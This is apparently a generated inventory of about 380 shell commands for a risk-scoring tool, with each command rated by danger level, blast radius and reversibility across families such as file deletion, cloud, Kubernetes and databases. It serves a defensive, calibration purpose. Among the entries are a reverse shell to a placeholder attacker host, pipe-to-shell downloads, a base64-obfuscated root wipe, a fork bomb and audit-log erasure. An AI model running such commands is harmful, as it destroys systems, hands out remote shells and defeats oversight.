# Command inventory

Every command [scoville](README.md) is calibrated against, grouped by family.
This file is generated from [`tests/corpus.tsv`](tests/corpus.tsv) by
`make inventory`, and the test suite asserts both that each command still
scores at the level shown and that this file is in sync.

Levels: `safe` 0–14 · `low` 15–34 · `medium` 35–59 · `high` 60–84 ·
`critical` 85–100. Scope is the blast radius, and reversibility is how hard
it is to get back.

382 commands catalogued: **56** safe · **39** low · **111** medium · **118** high · **58** critical.

## reading state

| Level    | Command                         | Scope | Reversibility |
| -------- | ------------------------------- | ----- | ------------- |
| `safe` 0 | `ls -la /etc`                   | none  | reversible    |
| `safe` 0 | `cat /etc/hostname`             | none  | reversible    |
| `safe` 0 | `grep -r TODO src/`             | none  | reversible    |
| `safe` 0 | `find . -name '*.py'`           | none  | reversible    |
| `safe` 0 | `df -h`                         | none  | reversible    |
| `safe` 0 | `ps aux`                        | none  | reversible    |
| `safe` 0 | `ss -tlnp`                      | none  | reversible    |
| `safe` 5 | `journalctl -u nginx`           | none  | reversible    |
| `safe` 0 | `systemctl status nginx`        | none  | reversible    |
| `safe` 0 | `ip addr show`                  | none  | reversible    |
| `safe` 0 | `dig example.com`               | none  | reversible    |
| `safe` 0 | `tail -f /var/log/syslog`       | none  | reversible    |
| `safe` 0 | `sed 's/a/b/' config.ini`       | none  | reversible    |
| `safe` 0 | `git status`                    | none  | reversible    |
| `safe` 0 | `git log --oneline -20`         | none  | reversible    |
| `safe` 0 | `git diff HEAD~1`               | none  | reversible    |
| `safe` 0 | `docker ps`                     | none  | reversible    |
| `safe` 0 | `docker logs web`               | none  | reversible    |
| `safe` 0 | `kubectl get pods -A`           | none  | reversible    |
| `safe` 0 | `kubectl describe deploy api`   | none  | reversible    |
| `safe` 0 | `helm list -A`                  | none  | reversible    |
| `safe` 0 | `terraform plan`                | none  | reversible    |
| `safe` 0 | `aws s3 ls`                     | none  | reversible    |
| `safe` 0 | `aws ec2 describe-instances`    | none  | reversible    |
| `safe` 0 | `gcloud compute instances list` | none  | reversible    |
| `safe` 0 | `az vm list`                    | none  | reversible    |
| `safe` 0 | `hcloud server list`            | none  | reversible    |
| `safe` 0 | `zfs list`                      | none  | reversible    |
| `safe` 0 | `dpkg -l`                       | none  | reversible    |
| `safe` 5 | `rpm -qa`                       | none  | reversible    |
| `safe` 5 | `brew list`                     | none  | reversible    |

## deleting files

| Level          | Command                             | Scope     | Reversibility |
| -------------- | ----------------------------------- | --------- | ------------- |
| `medium` 35    | `rm notes.txt`                      | file      | irreversible  |
| `low` 33       | `rm -rf node_modules`               | directory | irreversible  |
| `medium` 58    | `rm -rf ./build-output`             | directory | irreversible  |
| `high` 66      | `rm -rf /var/lib/mysql`             | host      | irreversible  |
| `critical` 100 | `rm -rf /`                          | host      | irreversible  |
| `critical` 100 | `rm -rf /*`                         | host      | irreversible  |
| `critical` 93  | `rm -rf /etc`                       | host      | irreversible  |
| `critical` 86  | `rm -rf ~`                          | host      | irreversible  |
| `critical` 98  | `rm -rf $HOME`                      | host      | irreversible  |
| `critical` 98  | `rm -rf $BUILD_DIR/`                | host      | irreversible  |
| `critical` 100 | `rm -rf --no-preserve-root /`       | host      | irreversible  |
| `medium` 55    | `shred -u secrets.env`              | file      | irreversible  |
| `low` 28       | `rmdir /var/empty`                  | host      | irreversible  |
| `medium` 45    | `truncate -s 0 app.log`             | file      | irreversible  |
| `critical` 100 | `find / -type f -exec shred {} +`   | host      | irreversible  |
| `medium` 50    | `find . -name '*.log' -delete`      | directory | irreversible  |
| `high` 63      | `rsync -a --delete /src/ /srv/www/` | host      | irreversible  |
| `low` 25       | `mv config.yml config.yml.bak`      | file      | recoverable   |

## overwriting and in-place edits

| Level       | Command                                                                   | Scope | Reversibility |
| ----------- | ------------------------------------------------------------------------- | ----- | ------------- |
| `medium` 35 | `sed -i 's/debug/info/' app.conf`                                         | file  | irreversible  |
| `high` 83   | `sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config` | host  | irreversible  |
| `low` 20    | `cp -r src/ dst/`                                                         | file  | recoverable   |
| `high` 80   | `tar -xzf backup.tar.gz -C /`                                             | host  | irreversible  |
| `low` 30    | `unzip -o release.zip`                                                    | none  | reversible    |

## devices and filesystems

| Level          | Command                             | Scope | Reversibility |
| -------------- | ----------------------------------- | ----- | ------------- |
| `critical` 85  | `mkfs.ext4 /dev/sda1`               | host  | irreversible  |
| `critical` 100 | `wipefs -a /dev/sdb`                | host  | irreversible  |
| `critical` 85  | `dd if=/dev/zero of=/dev/sda bs=1M` | host  | irreversible  |
| `medium` 45    | `dd if=image.iso of=/tmp/copy.iso`  | file  | irreversible  |
| `critical` 90  | `blkdiscard /dev/nvme0n1`           | host  | irreversible  |
| `critical` 90  | `cryptsetup luksFormat /dev/sdb1`   | host  | irreversible  |
| `critical` 85  | `badblocks -w /dev/sdc`             | host  | irreversible  |
| `critical` 85  | `zpool destroy tank`                | host  | irreversible  |
| `high` 80      | `zfs destroy tank/data@snapshot`    | host  | irreversible  |
| `high` 80      | `lvremove /dev/vg0/data`            | host  | irreversible  |
| `high` 80      | `mdadm --zero-superblock /dev/sdb1` | host  | irreversible  |
| `medium` 55    | `fsck -y /dev/sdb1`                 | host  | recoverable   |
| `high` 70      | `resize2fs /dev/vg0/data 10G`       | host  | irreversible  |
| `low` 15       | `mount /dev/sdb1 /mnt`              | host  | reversible    |
| `high` 70      | `mount -o remount,ro /`             | host  | recoverable   |
| `medium` 45    | `mount -o remount,ro /srv`          | host  | recoverable   |
| `medium` 35    | `umount /mnt/data`                  | host  | recoverable   |
| `high` 65      | `umount /`                          | host  | recoverable   |
| `high` 80      | `umount -a`                         | host  | recoverable   |
| `high` 80      | `umount -l /var`                    | host  | recoverable   |
| `critical` 95  | `umount -a -l`                      | host  | recoverable   |

## permissions and privilege

| Level          | Command                               | Scope | Reversibility |
| -------------- | ------------------------------------- | ----- | ------------- |
| `low` 25       | `chmod 600 ~/.ssh/id_rsa`             | file  | reversible    |
| `high` 68      | `chmod -R 777 /var/www`               | host  | irreversible  |
| `critical` 100 | `chmod -R 777 /`                      | host  | irreversible  |
| `medium` 53    | `chown -R www-data:www-data /srv/app` | host  | irreversible  |
| `high` 80      | `chown -R nobody /etc`                | host  | irreversible  |
| `high` 70      | `userdel -r deploy`                   | host  | irreversible  |
| `medium` 40    | `passwd deploy`                       | host  | recoverable   |
| `medium` 35    | `visudo`                              | host  | recoverable   |
| `critical` 100 | `sudo rm -rf /`                       | host  | irreversible  |
| `high` 80      | `sudo systemctl stop sshd`            | host  | recoverable   |

## system and services

| Level         | Command                              | Scope | Reversibility |
| ------------- | ------------------------------------ | ----- | ------------- |
| `medium` 45   | `systemctl stop nginx`               | host  | recoverable   |
| `medium` 45   | `systemctl disable --now postgresql` | host  | recoverable   |
| `high` 75     | `systemctl mask ssh`                 | host  | recoverable   |
| `safe` 0      | `systemctl status ssh`               | none  | reversible    |
| `high` 70     | `systemctl poweroff`                 | host  | recoverable   |
| `high` 70     | `reboot`                             | host  | recoverable   |
| `high` 70     | `shutdown -h now`                    | host  | recoverable   |
| `safe` 0      | `shutdown -c`                        | none  | reversible    |
| `medium` 55   | `shutdown -r +15`                    | host  | recoverable   |
| `critical` 85 | `reboot -f`                          | host  | recoverable   |
| `medium` 35   | `kill 4821`                          | host  | recoverable   |
| `medium` 50   | `pkill -9 node`                      | host  | recoverable   |
| `critical` 90 | `kill -9 1`                          | host  | recoverable   |
| `high` 60     | `crontab -r`                         | host  | irreversible  |
| `safe` 5      | `crontab -l`                         | none  | reversible    |
| `low` 25      | `systemctl restart nginx`            | host  | recoverable   |
| `medium` 35   | `sysctl -w vm.swappiness=10`         | host  | reversible    |
| `medium` 40   | `swapoff -a`                         | host  | reversible    |
| `low` 30      | `swapoff /swapfile`                  | host  | reversible    |
| `medium` 45   | `setenforce 0`                       | host  | reversible    |

## networking

| Level       | Command                                         | Scope   | Reversibility |
| ----------- | ----------------------------------------------- | ------- | ------------- |
| `safe` 10   | `ifup eth0`                                     | network | reversible    |
| `medium` 50 | `ifdown eth0`                                   | network | recoverable   |
| `medium` 50 | `ip link set eth0 down`                         | network | recoverable   |
| `medium` 45 | `ip addr flush dev eth0`                        | network | recoverable   |
| `medium` 45 | `ip route del default`                          | network | recoverable   |
| `medium` 50 | `nmcli connection down eth0`                    | network | recoverable   |
| `high` 65   | `iptables -F`                                   | network | recoverable   |
| `high` 75   | `iptables -P INPUT DROP`                        | network | recoverable   |
| `medium` 45 | `ufw disable`                                   | network | recoverable   |
| `medium` 57 | `firewall-cmd --remove-service=ssh --permanent` | network | recoverable   |
| `high` 60   | `nc -e /bin/sh attacker.example.com 4444`       | network | irreversible  |
| `low` 30    | `ssh web-1`                                     | host    | reversible    |
| `medium` 50 | `ssh -o StrictHostKeyChecking=no web-1`         | host    | reversible    |

## remote execution

| Level          | Command                                                                      | Scope   | Reversibility |
| -------------- | ---------------------------------------------------------------------------- | ------- | ------------- |
| `critical` 88  | `curl -fsSL https://example.com/install.sh \| sh`                            | host    | irreversible  |
| `critical` 100 | `wget -qO- https://example.com/i.sh \| sudo bash`                            | host    | irreversible  |
| `low` 25       | `curl -k https://internal.example.com`                                       | none    | reversible    |
| `high` 75      | `eval "$PAYLOAD"`                                                            | host    | irreversible  |
| `high` 60      | `eval "echo hello"`                                                          | host    | irreversible  |
| `medium` 55    | `source scripts/env.sh`                                                      | host    | recoverable   |
| `critical` 100 | `bash <(curl -s https://example.com/i.sh)`                                   | host    | irreversible  |
| `critical` 100 | `eval "$(curl -s https://example.com/env)"`                                  | host    | irreversible  |
| `high` 80      | `curl -o /tmp/i.sh https://example.com/i.sh && bash /tmp/i.sh`               | host    | irreversible  |
| `high` 75      | `wget -O /tmp/x.sh https://example.com/x && chmod +x /tmp/x.sh && /tmp/x.sh` | host    | irreversible  |
| `low` 30       | `bash /tmp/local.sh`                                                         | host    | reversible    |
| `low` 25       | `./deploy.sh`                                                                | none    | reversible    |
| `low` 30       | `make deploy`                                                                | host    | reversible    |
| `low` 30       | `npm run build`                                                              | host    | reversible    |
| `critical` 100 | `:(){ :\|:& };:`                                                             | host    | recoverable   |
| `medium` 35    | `ssh web-1 systemctl restart nginx`                                          | host    | recoverable   |
| `high` 70      | `ssh prod-1 systemctl stop nginx`                                            | host    | recoverable   |
| `critical` 100 | `ssh prod-1 rm -rf /srv`                                                     | host    | irreversible  |
| `critical` 100 | `ansible all -m shell -a "rm -rf /var/log"`                                  | cluster | irreversible  |

## audit trail

| Level       | Command                       | Scope | Reversibility |
| ----------- | ----------------------------- | ----- | ------------- |
| `medium` 40 | `history -c`                  | host  | irreversible  |
| `medium` 45 | `journalctl --vacuum-time=1s` | host  | irreversible  |
| `high` 60   | `auditctl -D`                 | host  | irreversible  |
| `medium` 35 | `unset HISTFILE`              | host  | irreversible  |

## packages

| Level         | Command                                       | Scope   | Reversibility |
| ------------- | --------------------------------------------- | ------- | ------------- |
| `medium` 35   | `apt install nginx`                           | host    | recoverable   |
| `medium` 43   | `apt-get install -y build-essential`          | host    | recoverable   |
| `medium` 35   | `apk add curl`                                | host    | recoverable   |
| `medium` 35   | `brew install postgresql`                     | host    | recoverable   |
| `medium` 35   | `pip install requests`                        | host    | recoverable   |
| `medium` 35   | `npm install express`                         | host    | recoverable   |
| `medium` 57   | `apt-get remove --purge nginx`                | host    | recoverable   |
| `medium` 45   | `apt autoremove`                              | host    | recoverable   |
| `medium` 45   | `apk del openssl`                             | host    | recoverable   |
| `medium` 45   | `brew uninstall postgresql`                   | host    | recoverable   |
| `medium` 53   | `pip uninstall -y django`                     | host    | recoverable   |
| `medium` 45   | `npm uninstall left-pad`                      | host    | recoverable   |
| `medium` 45   | `dnf remove httpd`                            | host    | recoverable   |
| `medium` 50   | `pacman -Rns base-devel`                      | host    | recoverable   |
| `high` 80     | `rpm -e glibc`                                | host    | recoverable   |
| `medium` 50   | `dpkg -P nginx`                               | host    | recoverable   |
| `critical` 87 | `apt-get remove --purge linux-image-generic`  | host    | recoverable   |
| `medium` 55   | `do-release-upgrade`                          | host    | recoverable   |
| `medium` 55   | `apt full-upgrade`                            | host    | recoverable   |
| `medium` 40   | `nix-collect-garbage -d`                      | host    | irreversible  |
| `medium` 55   | `pip install git+https://github.com/acme/lib` | host    | recoverable   |
| `high` 60     | `npm publish`                                 | account | irreversible  |
| `safe` 5      | `apt list --installed`                        | none    | reversible    |

## git

| Level       | Command                               | Scope     | Reversibility |
| ----------- | ------------------------------------- | --------- | ------------- |
| `low` 20    | `git push`                            | network   | recoverable   |
| `safe` 5    | `git commit -am 'wip'`                | none      | reversible    |
| `high` 80   | `git push --force origin main`        | network   | irreversible  |
| `medium` 55 | `git push --force origin feature-x`   | network   | irreversible  |
| `medium` 50 | `git push --delete origin old-branch` | network   | recoverable   |
| `medium` 52 | `git reset --hard HEAD~3`             | directory | irreversible  |
| `medium` 45 | `git clean -fdx`                      | directory | irreversible  |
| `medium` 35 | `git checkout .`                      | directory | irreversible  |
| `low` 25    | `git branch -D feature-x`             | directory | recoverable   |
| `medium` 45 | `git rebase -i HEAD~5`                | directory | recoverable   |

## containers

| Level          | Command                                                              | Scope     | Reversibility |
| -------------- | -------------------------------------------------------------------- | --------- | ------------- |
| `safe` 0       | `docker ps -a`                                                       | none      | reversible    |
| `low` 20       | `docker exec web ls /app`                                            | container | reversible    |
| `low` 33       | `docker exec web psql -c 'SELECT 1'`                                 | container | recoverable   |
| `critical` 100 | `docker exec -u root api rm -rf /`                                   | container | irreversible  |
| `high` 84      | `docker exec -u root api rm -rf /var/lib/data`                       | container | irreversible  |
| `medium` 40    | `docker run acme/importer:1.2`                                       | container | reversible    |
| `critical` 100 | `docker run --privileged -v /:/host alpine sh -c 'rm -rf /host/etc'` | host      | irreversible  |
| `low` 30       | `docker rm -f web`                                                   | container | recoverable   |
| `low` 30       | `docker rmi acme/api:old`                                            | container | recoverable   |
| `high` 60      | `docker volume rm pgdata`                                            | host      | irreversible  |
| `medium` 45    | `docker system prune -a`                                             | host      | irreversible  |
| `medium` 45    | `docker image prune`                                                 | host      | irreversible  |
| `high` 60      | `docker-compose down -v`                                             | host      | irreversible  |
| `low` 30       | `docker stop web`                                                    | container | recoverable   |

## kubernetes

| Level         | Command                                   | Scope   | Reversibility |
| ------------- | ----------------------------------------- | ------- | ------------- |
| `safe` 0      | `kubectl get pods`                        | none    | reversible    |
| `safe` 0      | `kubectl auth can-i delete pods`          | none    | reversible    |
| `low` 30      | `kubectl apply -f deploy.yaml`            | cluster | recoverable   |
| `low` 30      | `kubectl edit deploy api`                 | cluster | recoverable   |
| `medium` 55   | `kubectl delete deploy api`               | cluster | irreversible  |
| `critical` 95 | `kubectl delete ns prod`                  | cluster | irreversible  |
| `critical` 85 | `kubectl delete crd widgets.acme.io`      | cluster | irreversible  |
| `high` 75     | `kubectl delete pvc data-0`               | cluster | irreversible  |
| `high` 80     | `kubectl delete pods --all -A`            | cluster | irreversible  |
| `medium` 50   | `kubectl drain node-1`                    | cluster | recoverable   |
| `low` 20      | `kubectl cordon node-1`                   | cluster | reversible    |
| `low` 25      | `kubectl delete pod api-1`                | cluster | recoverable   |
| `medium` 45   | `kubectl scale deploy api --replicas=0`   | cluster | reversible    |
| `critical` 99 | `kubectl exec -it pod-1 -- rm -rf /data`  | cluster | irreversible  |
| `low` 15      | `kubectl port-forward svc/db 5432:5432`   | network | reversible    |
| `safe` 12     | `kubectl delete ns prod --dry-run=client` | cluster | reversible    |
| `medium` 35   | `helm upgrade --install api ./chart`      | cluster | recoverable   |
| `high` 60     | `helm uninstall api`                      | cluster | irreversible  |

## infrastructure as code

| Level          | Command                                             | Scope   | Reversibility |
| -------------- | --------------------------------------------------- | ------- | ------------- |
| `safe` 0       | `terraform validate`                                | none    | reversible    |
| `medium` 45    | `terraform apply`                                   | account | recoverable   |
| `high` 75      | `terraform apply -auto-approve -target=module.prod` | account | recoverable   |
| `high` 80      | `terraform destroy`                                 | account | irreversible  |
| `critical` 95  | `terraform destroy -auto-approve`                   | account | irreversible  |
| `high` 60      | `terraform state rm aws_db_instance.main`           | account | recoverable   |
| `medium` 40    | `terraform taint aws_instance.web`                  | account | recoverable   |
| `high` 80      | `pulumi destroy`                                    | account | irreversible  |
| `medium` 45    | `pulumi up`                                         | account | recoverable   |
| `critical` 100 | `eksctl delete cluster --name prod`                 | account | irreversible  |

## aws

| Level          | Command                                                                               | Scope   | Reversibility |
| -------------- | ------------------------------------------------------------------------------------- | ------- | ------------- |
| `safe` 0       | `aws s3api list-buckets`                                                              | none    | reversible    |
| `safe` 0       | `aws iam get-role --role-name app`                                                    | none    | reversible    |
| `low` 30       | `aws ec2 create-tags --resources i-1 --tags Key=a,Value=b`                            | account | recoverable   |
| `high` 75      | `aws s3 rb s3://assets`                                                               | account | irreversible  |
| `critical` 95  | `aws s3 rm s3://assets --recursive`                                                   | account | irreversible  |
| `safe` 12      | `aws s3 rm s3://assets --recursive --dryrun`                                          | account | reversible    |
| `high` 80      | `aws ec2 terminate-instances --instance-ids i-123`                                    | account | irreversible  |
| `critical` 100 | `aws rds delete-db-instance --db-instance-identifier prod --skip-final-snapshot`      | account | irreversible  |
| `critical` 95  | `aws cloudformation delete-stack --stack-name prod`                                   | account | irreversible  |
| `critical` 85  | `aws kms schedule-key-deletion --key-id abc`                                          | account | irreversible  |
| `high` 70      | `aws iam detach-role-policy --role-name app --policy-arn arn:aws:iam::aws:policy/X`   | account | recoverable   |
| `high` 70      | `aws iam delete-user --user-name deploy`                                              | account | recoverable   |
| `critical` 90  | `aws organizations remove-account-from-organization --account-id 111`                 | account | irreversible  |
| `medium` 50    | `aws iam create-access-key --user-name deploy`                                        | account | recoverable   |
| `high` 70      | `aws s3api put-bucket-acl --bucket assets --acl public-read`                          | account | recoverable   |
| `high` 65      | `aws ec2 authorize-security-group-ingress --group-id sg-1 --cidr 0.0.0.0/0 --port 22` | account | recoverable   |

## other clouds and SaaS

| Level          | Command                                                                                      | Scope   | Reversibility |
| -------------- | -------------------------------------------------------------------------------------------- | ------- | ------------- |
| `safe` 0       | `gcloud projects describe acme`                                                              | none    | reversible    |
| `critical` 90  | `gcloud projects delete acme`                                                                | account | irreversible  |
| `high` 65      | `gcloud compute instances delete web-1`                                                      | account | irreversible  |
| `high` 70      | `gcloud storage buckets add-iam-policy-binding gs://b --member=allUsers --role=roles/viewer` | account | recoverable   |
| `critical` 100 | `az group delete --name prod --yes`                                                          | account | irreversible  |
| `high` 65      | `az vm delete --name web-1`                                                                  | account | irreversible  |
| `high` 65      | `hcloud server delete my-db`                                                                 | account | irreversible  |
| `high` 65      | `scw instance server terminate 11111111`                                                     | account | irreversible  |
| `high` 65      | `doctl compute droplet delete web-1`                                                         | account | irreversible  |
| `critical` 85  | `heroku pg:reset DATABASE_URL`                                                               | account | irreversible  |
| `high` 65      | `wrangler r2 bucket delete assets`                                                           | account | irreversible  |
| `high` 60      | `frobctl delete cluster prod`                                                                | account | irreversible  |

## vault

| Level         | Command                                              | Scope   | Reversibility |
| ------------- | ---------------------------------------------------- | ------- | ------------- |
| `safe` 0      | `vault kv list secret/`                              | none    | reversible    |
| `low` 15      | `vault read secret/data/db`                          | account | reversible    |
| `medium` 35   | `vault kv delete secret/db`                          | account | recoverable   |
| `high` 70     | `vault kv destroy -versions=1 secret/db`             | account | irreversible  |
| `high` 80     | `vault secrets disable kv/`                          | account | irreversible  |
| `high` 75     | `vault auth disable approle/`                        | account | irreversible  |
| `high` 60     | `vault audit disable file/`                          | account | irreversible  |
| `high` 80     | `vault lease revoke -prefix database/creds/readonly` | account | irreversible  |
| `medium` 45   | `vault token revoke hvs.CAESIA`                      | account | irreversible  |
| `medium` 55   | `vault policy delete deploy`                         | account | recoverable   |
| `high` 60     | `vault operator seal`                                | cluster | recoverable   |
| `high` 70     | `vault operator rekey -init`                         | cluster | irreversible  |
| `critical` 90 | `vault operator raft snapshot restore backup.snap`   | cluster | irreversible  |
| `high` 65     | `vault operator raft remove-peer node-2`             | cluster | recoverable   |
| `safe` 5      | `vault write -output-curl-string secret/db value=x`  | none    | reversible    |

## velero

| Level       | Command                                                                         | Scope   | Reversibility |
| ----------- | ------------------------------------------------------------------------------- | ------- | ------------- |
| `safe` 0    | `velero backup get`                                                             | none    | reversible    |
| `safe` 10   | `velero backup create daily-1 --include-namespaces app`                         | cluster | reversible    |
| `medium` 35 | `velero restore delete r1`                                                      | cluster | recoverable   |
| `medium` 50 | `velero restore create --from-backup daily-1`                                   | cluster | irreversible  |
| `high` 70   | `velero restore create --from-backup daily-1 --existing-resource-policy=update` | cluster | irreversible  |
| `medium` 55 | `velero schedule delete nightly`                                                | cluster | recoverable   |
| `high` 70   | `velero backup delete daily-1`                                                  | cluster | irreversible  |
| `high` 65   | `velero backup-location delete default`                                         | cluster | irreversible  |
| `high` 75   | `velero uninstall`                                                              | cluster | irreversible  |

## argocd

| Level       | Command                                            | Scope   | Reversibility |
| ----------- | -------------------------------------------------- | ------- | ------------- |
| `safe` 0    | `argocd app list`                                  | none    | reversible    |
| `medium` 40 | `argocd app sync api`                              | cluster | recoverable   |
| `high` 65   | `argocd app sync api --prune`                      | cluster | irreversible  |
| `medium` 40 | `argocd app delete api --cascade=false`            | cluster | irreversible  |
| `high` 60   | `argocd app delete api`                            | cluster | irreversible  |
| `medium` 45 | `argocd cluster rm https://k8s.internal`           | cluster | recoverable   |
| `medium` 40 | `argocd repo rm https://github.com/acme/manifests` | cluster | recoverable   |
| `high` 70   | `argocd proj delete platform`                      | cluster | irreversible  |
| `high` 70   | `argocd admin import backup.yaml`                  | cluster | irreversible  |

## openstack

| Level         | Command                                                                         | Scope   | Reversibility |
| ------------- | ------------------------------------------------------------------------------- | ------- | ------------- |
| `safe` 0      | `openstack server list`                                                         | none    | reversible    |
| `low` 30      | `openstack server stop web-1`                                                   | account | recoverable   |
| `high` 70     | `openstack server delete web-1`                                                 | account | irreversible  |
| `high` 80     | `openstack volume delete vol-1`                                                 | account | irreversible  |
| `high` 65     | `openstack volume snapshot delete snap-1`                                       | account | irreversible  |
| `high` 60     | `openstack image delete ubuntu-22.04`                                           | account | irreversible  |
| `high` 60     | `openstack project delete acme`                                                 | account | irreversible  |
| `critical` 88 | `openstack project purge --project acme`                                        | account | irreversible  |
| `critical` 85 | `openstack stack delete platform`                                               | account | irreversible  |
| `high` 70     | `openstack network delete internal`                                             | network | irreversible  |
| `high` 75     | `openstack endpoint delete 1a2b3c`                                              | account | irreversible  |
| `medium` 55   | `openstack user delete deploy`                                                  | account | irreversible  |
| `low` 30      | `openstack security group rule create --remote-ip 10.0.0.0/8 --dst-port 22 web` | network | reversible    |
| `high` 65     | `openstack security group rule create --remote-ip 0.0.0.0/0 --dst-port 22 web`  | network | reversible    |

## flyctl

| Level         | Command                                                 | Scope   | Reversibility |
| ------------- | ------------------------------------------------------- | ------- | ------------- |
| `safe` 0      | `flyctl apps list`                                      | none    | reversible    |
| `medium` 35   | `flyctl deploy`                                         | account | recoverable   |
| `high` 60     | `flyctl deploy --strategy immediate`                    | account | recoverable   |
| `medium` 40   | `flyctl secrets set DATABASE_URL=postgres://db`         | account | recoverable   |
| `low` 25      | `flyctl secrets set DATABASE_URL=postgres://db --stage` | account | recoverable   |
| `medium` 55   | `flyctl scale count 0`                                  | account | recoverable   |
| `medium` 55   | `flyctl machine destroy 4d891de2`                       | account | recoverable   |
| `medium` 45   | `flyctl certs remove api.example.com`                   | network | recoverable   |
| `high` 65     | `flyctl pg detach my-db`                                | account | irreversible  |
| `high` 80     | `flyctl apps destroy api`                               | account | irreversible  |
| `critical` 85 | `flyctl volumes destroy vol_2n0l3vlnklpr8qy7`           | account | irreversible  |

## gh

| Level       | Command                                  | Scope   | Reversibility |
| ----------- | ---------------------------------------- | ------- | ------------- |
| `safe` 0    | `gh pr list`                             | none    | reversible    |
| `low` 25    | `gh pr create --title 'fix'`             | account | recoverable   |
| `low` 20    | `gh repo archive acme/api`               | account | recoverable   |
| `medium` 40 | `gh pr merge 42 --squash`                | account | recoverable   |
| `low` 28    | `gh pr merge 42 --auto --squash`         | account | recoverable   |
| `high` 62   | `gh pr merge 42 --admin --squash`        | account | recoverable   |
| `medium` 50 | `gh issue delete 17`                     | account | irreversible  |
| `medium` 55 | `gh release delete v1.2.0`               | account | irreversible  |
| `high` 67   | `gh release delete v1.2.0 --cleanup-tag` | account | irreversible  |
| `medium` 35 | `gh run delete 1234567`                  | account | irreversible  |
| `medium` 40 | `gh secret set DEPLOY_KEY`               | account | recoverable   |
| `medium` 35 | `gh workflow run deploy.yml`             | account | recoverable   |
| `medium` 35 | `gh auth token`                          | account | reversible    |
| `medium` 45 | `gh api -X PATCH /repos/acme/api`        | account | recoverable   |
| `high` 70   | `gh api -X DELETE /repos/acme/api`       | account | irreversible  |
| `high` 75   | `gh repo delete acme/api`                | account | irreversible  |
| `high` 65   | `gh label delete wontfix`                | account | irreversible  |

## databases

| Level         | Command                                         | Scope   | Reversibility |
| ------------- | ----------------------------------------------- | ------- | ------------- |
| `low` 15      | `psql -c 'SELECT count(*) FROM orders'`         | host    | recoverable   |
| `high` 78     | `psql -c 'DROP TABLE users'`                    | account | irreversible  |
| `critical` 88 | `psql -c 'DROP DATABASE app'`                   | account | irreversible  |
| `high` 75     | `mysql -e 'DELETE FROM orders'`                 | account | irreversible  |
| `high` 70     | `mysql -e 'TRUNCATE TABLE sessions'`            | account | irreversible  |
| `high` 70     | `psql -c 'ALTER TABLE users DROP COLUMN email'` | account | irreversible  |
| `medium` 45   | `psql -c 'GRANT ALL ON DATABASE app TO deploy'` | account | recoverable   |
| `critical` 85 | `redis-cli FLUSHALL`                            | account | irreversible  |
| `critical` 88 | `mongosh --eval 'db.dropDatabase()'`            | account | irreversible  |
| `high` 60     | `pg_restore --clean -d app dump.sql`            | account | irreversible  |

## storage and backup tooling

| Level         | Command                               | Scope   | Reversibility |
| ------------- | ------------------------------------- | ------- | ------------- |
| `medium` 55   | `rclone sync /srv/data remote:bucket` | account | irreversible  |
| `high` 70     | `rclone purge remote:bucket`          | account | irreversible  |
| `high` 77     | `restic forget --prune --keep-last 1` | account | irreversible  |
| `high` 65     | `s3cmd rb s3://assets`                | account | irreversible  |
| `critical` 90 | `etcdctl del --prefix ''`             | cluster | irreversible  |

## virtualisation

| Level       | Command                                     | Scope   | Reversibility |
| ----------- | ------------------------------------------- | ------- | ------------- |
| `medium` 45 | `virsh destroy vm1`                         | host    | recoverable   |
| `high` 70   | `virsh undefine vm1`                        | host    | irreversible  |
| `high` 70   | `virsh vol-delete --pool default vm1.qcow2` | host    | irreversible  |
| `high` 65   | `incus delete web-1`                        | account | irreversible  |
| `medium` 45 | `snap remove docker`                        | host    | recoverable   |

## generic arguments

| Level         | Command                                                               | Scope     | Reversibility |
| ------------- | --------------------------------------------------------------------- | --------- | ------------- |
| `medium` 38   | `rm -ri /tmp/cache`                                                   | directory | irreversible  |
| `low` 23      | `sed -i.bak 's/a/b/' app.conf`                                        | file      | irreversible  |
| `medium` 40   | `mysql -h db --password=hunter2 -e 'SELECT 1'`                        | host      | recoverable   |
| `high` 68     | `apt-get install -y --allow-unauthenticated foo`                      | host      | recoverable   |
| `low` 25      | `curl --insecure https://internal.example.com`                        | none      | reversible    |
| `low` 15      | `git push --force-with-lease origin main`                             | network   | recoverable   |
| `high` 65     | `gcloud compute firewall-rules create open --source-ranges=0.0.0.0/0` | account   | recoverable   |
| `critical` 88 | `echo cm0gLXJmIC8K \| base64 -d \| sh`                                | host      | irreversible  |
| `medium` 55   | `ansible all -m shell -a 'systemctl restart nginx' --limit web-1`     | cluster   | recoverable   |
| `medium` 53   | `apt-get remove -qy nginx`                                            | host      | recoverable   |
| `medium` 53   | `conda remove -y numpy`                                               | host      | recoverable   |
| `medium` 53   | `frobctl delete cluster -y`                                           | account   | irreversible  |
| `safe` 5      | `fsck -n /dev/sdb1`                                                   | none      | reversible    |
| `safe` 12     | `rsync -n --delete /src/ /srv/www/`                                   | host      | reversible    |

## boot path and kernel

| Level       | Command                           | Scope | Reversibility |
| ----------- | --------------------------------- | ----- | ------------- |
| `high` 60   | `grub-install /dev/sda`           | host  | recoverable   |
| `high` 60   | `update-grub`                     | host  | recoverable   |
| `high` 65   | `tune2fs -U random /dev/sda1`     | host  | recoverable   |
| `high` 70   | `kexec -e`                        | host  | recoverable   |
| `medium` 45 | `modprobe -r e1000e`              | host  | recoverable   |
| `medium` 40 | `timedatectl set-time 2020-01-01` | host  | recoverable   |

## keys and certificates

| Level     | Command                             | Scope   | Reversibility |
| --------- | ----------------------------------- | ------- | ------------- |
| `high` 70 | `certbot revoke --cert-name api`    | network | irreversible  |
| `high` 75 | `gpg --delete-secret-keys ABCD1234` | account | irreversible  |

## cluster membership

| Level         | Command                                | Scope   | Reversibility |
| ------------- | -------------------------------------- | ------- | ------------- |
| `critical` 85 | `kubeadm reset`                        | cluster | irreversible  |
| `high` 72     | `docker swarm leave --force`           | cluster | recoverable   |
| `high` 80     | `etcdctl snapshot restore snapshot.db` | cluster | irreversible  |

## data services

| Level         | Command                                           | Scope   | Reversibility |
| ------------- | ------------------------------------------------- | ------- | ------------- |
| `high` 75     | `rabbitmqctl reset`                               | account | irreversible  |
| `high` 75     | `kafka-topics --delete --topic events`            | account | irreversible  |
| `critical` 90 | `pg_resetwal /var/lib/pgsql/data`                 | account | irreversible  |
| `medium` 55   | `pg_ctl stop -m immediate -D /var/lib/pgsql/data` | host    | recoverable   |
| `high` 70     | `mysqladmin shutdown`                             | account | irreversible  |

## schema migrations

| Level         | Command                    | Scope   | Reversibility |
| ------------- | -------------------------- | ------- | ------------- |
| `critical` 90 | `flyway clean`             | account | irreversible  |
